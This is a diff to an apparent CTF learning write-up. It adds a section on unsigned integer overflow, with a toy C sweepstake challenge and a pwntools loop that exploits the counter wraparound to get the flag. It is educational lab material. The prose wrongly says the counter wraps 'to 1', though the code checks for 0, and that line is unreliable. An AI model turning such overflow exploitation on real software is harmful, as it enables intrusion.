@@ -446,6 +446,68 @@ p.sendlineafter(b'2024: ', payload)
 p.interactive()
 ```
 ![alt text](/images/image-6-4.png)
+---
+
+### Integer Overflow & Signal
+
+> Integers have a maximum size, and if you go past the maximum size, it becomes a small number (either negative or zero).
+>
+> For example, a single (unsigned) byte has a maximum value of 255. Adding one to the byte will set the value to 0, not 256.
+>
+> The largest (unsigned) values for ints (4 bytes) and longs (8 bytes) are 4294967295 and 18446744073709551615 respectively. (roughly 2^32 and 2^64).
+
+```
+#include <stdio.h>
+#include <string.h>
+// gcc -g -o chal chal.c
+
+int main() {
+    puts("Welcome to our user email sweepstake!");
+    puts("Only the first user gets the flag.");
+
+    unsigned char count = 5;  
+    char email[32];
+
+    while (1) {
+        puts("Enter email: ");
+        fgets(email, 31, stdin);
+        email[strcspn(email, "\n")] = 0;
+
+        if (count == 0) {
+            printf("Congrats %s, you are the first user (count=%d).\n", email, count);
+            puts("flag{win}");
+            return 0;
+        } else {
+            printf("Sorry %s, you are not the first user (count=%d). No flag for you.\n", email, count);
+        }
+
+        count++;
+    }
+}
+```
+
+We just send input until the `count` wraps around to 1.
+
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.binary = exe = ELF("./chal", checksec = False)
+p = process(exe.path)
+
+while True:
+    p.sendlineafter(b"email: \n", b'D')
+    line = p.recvline()
+    print(f"{line=}")
+
+    if b"Congrats" in line:
+        p.interactive()
+        exit(0)
+```
+
+
+
 
 ---
-### Integer Overflow & Signal
+### Heap
